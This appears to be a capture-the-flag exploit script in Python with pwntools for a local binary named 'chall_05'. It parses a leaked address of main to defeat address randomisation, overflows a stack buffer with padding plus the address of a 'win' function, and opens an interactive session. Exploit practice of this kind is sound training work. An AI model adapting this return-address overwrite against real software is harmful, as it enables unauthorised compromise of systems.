from pwn import *
import re


context.arch = "amd64"
binary = context.binary = ELF('./chall_05')
p = process(binary.path)
resp = p.recv()
print(resp.decode())

leak_match = re.findall(b"(0x[0-9a-f]{6,16})", resp)

if not leak_match:
    log.error("No memory address leak found in the binary's output.")
    exit(1)

try:
    main_leak = int(leak_match[0], 16)
    log.info(f"Leaked main address: {hex(main_leak)}")
except ValueError:
    log.error("Failed to convert leaked address to an integer.")
    exit(1)

binary.address = main_leak - binary.sym.main
log.info(f"Calculated base address of the binary: {hex(binary.address)}")

if 'win' not in binary.symbols:
    log.error("'win' function not found in the binary.")
    exit(1)

win_addr = binary.sym.win
log.info(f"'win' function address: {hex(win_addr)}")

buffer_offset = 0x68  
return_address_offset = 0x10  
buffer_size = buffer_offset - return_address_offset

try:
    payload = b'A' * buffer_size 
    payload += p64(win_addr) 
    log.info(f"Payload length: {len(payload)} bytes")
except Exception as e:
    log.error(f"Error creating payload: {e}")
    exit(1)

try:
    p.sendline(payload)
    log.info("Payload sent successfully.")
except Exception as e:
    log.error(f"Error sending payload: {e}")
    exit(1)

try:
    p.interactive()
except Exception as e:
    log.error(f"Error interacting with the process: {e}")
    exit(1)
